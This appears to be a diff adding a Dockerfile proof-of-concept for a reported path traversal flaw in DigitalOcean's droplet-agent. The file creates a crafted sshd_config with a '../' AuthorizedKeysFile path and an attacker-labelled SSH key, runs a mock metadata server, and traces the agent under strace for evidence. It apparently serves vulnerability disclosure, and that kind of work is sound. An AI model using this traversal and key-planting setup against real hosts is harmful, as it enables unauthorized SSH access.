@@ -1,0 +1,189 @@
+FROM golang:1.25-alpine AS builder
+
+# Install build dependencies
+RUN apk add --no-cache git make musl-dev
+
+# Clone droplet-agent repository
+WORKDIR /build
+RUN git clone https://github.com/digitalocean/droplet-agent.git
+WORKDIR /build/droplet-agent
+
+# Build the droplet-agent directly with go build (avoiding make/docker dependency)
+RUN CGO_ENABLED=0 GOOS=linux go build -buildvcs=false -ldflags '-s -w' -trimpath -o droplet-agent ./cmd/agent/
+
+# Create runtime image with debugging tools
+FROM alpine:latest
+
+# Install runtime dependencies and debugging tools
+RUN apk add --no-cache \
+    strace \
+    python3 \
+    py3-pip \
+    curl \
+    netcat-openbsd \
+    procps \
+    util-linux
+
+# Copy the built droplet-agent
+COPY --from=builder /build/droplet-agent/droplet-agent /usr/local/bin/droplet-agent
+
+# Create working directory
+WORKDIR /poc
+
+# Create the malicious sshd_config with path traversal
+RUN echo "Port 22" > /tmp/malicious_sshd_config && \
+    echo "PasswordAuthentication no" >> /tmp/malicious_sshd_config && \
+    echo "PubkeyAuthentication yes" >> /tmp/malicious_sshd_config && \
+    echo "AuthorizedKeysFile ../../../tmp/evil_keys" >> /tmp/malicious_sshd_config
+
+# Create the attacker-controlled SSH key file at traversal target
+RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vI6AOkZhLlqgPfYd123456789abcdef attacker@evil.com # MALICIOUS KEY VIA PATH TRAVERSAL" > /tmp/evil_keys
+
+# Create metadata server script
+RUN cat > /poc/metadata_server.py << 'EOF'
+#!/usr/bin/env python3
+import json
+import time
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class MetadataHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[METADATA] Request: {self.path} from {self.client_address}")
+
+        if '/metadata/v1.json' in self.path:
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+
+            # Return valid metadata that will trigger key update
+            response = {
+                "public_keys": [
+                    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vI6AOkZhLlqgPfYd123456789abcdef test@legitimate.com"
+                ]
+            }
+
+            response_json = json.dumps(response)
+            self.wfile.write(response_json.encode())
+            print(f"[METADATA] Served SSH key response")
+        else:
+            self.send_response(404)
+            self.end_headers()
+            print(f"[METADATA] 404 for path: {self.path}")
+
+    def log_message(self, format, *args):
+        pass  # Suppress default logs
+
+if __name__ == '__main__':
+    print("[METADATA] Starting metadata server on 0.0.0.0:8080")
+    server = HTTPServer(('0.0.0.0', 8080), MetadataHandler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("[METADATA] Server stopped")
+EOF
+
+# Create the main PoC execution script
+RUN cat > /poc/run_poc.sh << 'EOF'
+#!/bin/sh
+set -e
+
+echo "🚨 DigitalOcean Droplet Agent Path Traversal PoC"
+echo "   Report ID: DIGITALOCEAN-FJNTQHAO"
+echo "=============================================================="
+
+echo "📋 SETUP PHASE"
+echo "1. Checking malicious files..."
+echo "   Malicious sshd_config:"
+cat /tmp/malicious_sshd_config
+echo
+echo "   Evil SSH keys file:"
+cat /tmp/evil_keys
+echo
+
+# Map metadata service to localhost for testing
+echo "127.0.0.1 169.254.169.254" >> /etc/hosts
+
+echo "2. Starting mock metadata server..."
+python3 /poc/metadata_server.py &
+METADATA_PID=$!
+sleep 3
+
+echo "3. Testing metadata endpoint..."
+curl -s http://127.0.0.1:8080/metadata/v1.json 2>/dev/null || echo "Direct connection test"
+
+echo
+echo "🧪 VULNERABILITY TESTING PHASE"
+echo "Running droplet-agent with malicious config under strace..."
+
+# Capture the evidence with more comprehensive tracing
+echo "Executing: strace -f -e trace=openat,open,stat droplet-agent -sshd_config /tmp/malicious_sshd_config"
+
+timeout 20 strace -f -e trace=openat,open,stat /usr/local/bin/droplet-agent \
+    -sshd_config /tmp/malicious_sshd_config \
+    -debug 2>&1 | tee /poc/strace_output.log || echo "Command timed out (expected)"
+
+echo
+echo "📊 EVIDENCE ANALYSIS"
+echo "=============================================================="
+
+# Check for direct evidence
+if grep -q "/tmp/evil_keys" /poc/strace_output.log; then
+    echo "🚨 VULNERABILITY CONFIRMED! 🚨"
+    echo "Path traversal evidence found:"
+    echo "------------------------------------------------------------"
+    grep "/tmp/evil_keys" /poc/strace_output.log | head -3
+    echo "------------------------------------------------------------"
+else
+    echo "🔍 Analyzing other evidence..."
+
+    # Check for config file access
+    if grep -q "malicious_sshd_config" /poc/strace_output.log; then
+        echo "✅ Confirmed: Agent parsed malicious sshd_config:"
+        grep "malicious_sshd_config" /poc/strace_output.log | head -2
+    fi
+
+    # Check for authorization key file patterns
+    echo "🔍 Checking for AuthorizedKeysFile parsing patterns..."
+    grep -E "(AuthorizedKeysFile|\.ssh|authorized)" /poc/strace_output.log | head -3 || echo "No auth file patterns found"
+fi
+
+echo
+echo "📁 FILES ACCESSED BY AGENT:"
+echo "------------------------------------------------------------"
+grep -E "openat|open" /poc/strace_output.log | grep -v "ENOENT" | head -10 || echo "No file access captured"
+
+echo
+echo "💾 Full strace output available at /poc/strace_output.log"
+echo "Lines in strace output: $(wc -l < /poc/strace_output.log)"
+
+# Show agent startup logs
+echo
+echo "🔍 AGENT OUTPUT ANALYSIS:"
+echo "------------------------------------------------------------"
+grep -E "(WatchSSHDConfig|AuthorizedKeysFile|error|watching)" /poc/strace_output.log | head -5 || echo "No agent logs captured"
+
+# Cleanup
+kill $METADATA_PID 2>/dev/null || true
+
+echo
+echo "✅ PoC execution completed"
+echo "=============================================================="
+
+# Code analysis section
+echo "🔬 VULNERABILITY CODE ANALYSIS"
+echo "The vulnerable code is in droplet-agent/internal/sysaccess/sshmgr.go:"
+echo "Lines 350-353:"
+echo "  if keyFile[0] != '/' {"
+echo "      keyFile = \"%h/\" + keyFile"
+echo "  }"
+echo "  s.authorizedKeysFilePattern = keyFile"
+echo
+echo "❌ ISSUE: No validation for '../' path traversal sequences"
+echo "✅ FIX: Add filepath.Clean() and containment validation"
+EOF
+
+RUN chmod +x /poc/run_poc.sh /poc/metadata_server.py
+
+# Default command
+CMD ["/poc/run_poc.sh"]
